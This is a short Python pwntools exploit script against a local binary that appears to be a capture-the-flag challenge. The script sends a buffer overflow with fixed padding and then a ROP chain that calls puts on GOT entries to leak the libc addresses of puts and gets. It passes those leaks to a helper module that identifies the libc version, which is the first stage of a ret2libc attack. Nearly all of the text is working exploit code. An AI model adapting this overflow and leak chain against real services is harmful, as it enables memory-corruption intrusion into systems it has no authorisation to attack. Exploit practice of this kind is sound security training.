from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_remoteLibcId-0-x64")
payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(0x401203)
payload += p64(0x404018)
payload += p64(0x401050)
payload += p64(0x401203)
payload += p64(0x404020)
payload += p64(0x401050)
target.sendline(payload)
target.recvline()
leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "gets"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "gets", gotAddress1)
